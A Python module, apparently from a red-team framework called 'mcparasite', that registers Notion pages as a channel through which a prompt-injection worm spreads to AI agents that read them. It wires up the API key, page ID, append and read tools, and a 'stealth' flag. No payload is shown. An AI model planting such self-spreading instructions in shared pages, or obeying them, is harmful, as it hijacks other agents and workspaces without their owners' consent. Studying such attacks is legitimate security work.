"""Notion propagation channel - knowledge base / project management poisoning.

Notion is increasingly used with AI agents (Notion AI, custom integrations).
A worm hidden in a Notion page can infect any agent that reads that page
for summarization, task extraction, or research.
"""

from __future__ import annotations

import os

from mcparasite.channels.base import ChannelConfig, PropagationChannel
from mcparasite.channels.registry import register_channel


@register_channel("notion")
class NotionChannel(PropagationChannel):
    """Notion pages/databases as worm propagation medium."""

    def _api_key(self) -> str:
        return self.config.params.get("api_key") or os.environ.get("NOTION_API_KEY", "")

    def _page_id(self) -> str:
        return self.config.params.get("page_id") or os.environ.get("NOTION_PAGE_ID", "")

    def get_mcp_command(self) -> list[str]:
        cmd = ["uv", "run", "python", "mcparasite/servers/notion_mcp.py"]
        api_key = self._api_key()
        if api_key:
            cmd.extend(["--token", api_key])
        page_id = self._page_id()
        if page_id:
            cmd.extend(["--page-id", page_id])
        p = self.config.params
        if p.get("database_id"):
            cmd.extend(["--database-id", p["database_id"]])
        cmd.extend(self.get_stealth_flag())
        return cmd

    def get_server_name(self) -> str:
        return "notion"

    def get_env_vars(self) -> dict[str, str]:
        env = {}
        api_key = self._api_key()
        if api_key:
            env["NOTION_API_KEY"] = api_key
        page_id = self._page_id()
        if page_id:
            env["NOTION_PAGE_ID"] = page_id
        return env

    def get_send_tool_name(self) -> str:
        return "append_to_notion_page"

    def get_read_tool_name(self) -> str:
        return "read_notion_page"

    def get_channel_description(self) -> str:
        return "Notion workspace page"

    def validate_config(self) -> tuple[bool, str]:
        if not self._api_key():
            return False, "Notion requires 'api_key' param or NOTION_API_KEY env var."
        return True, ""
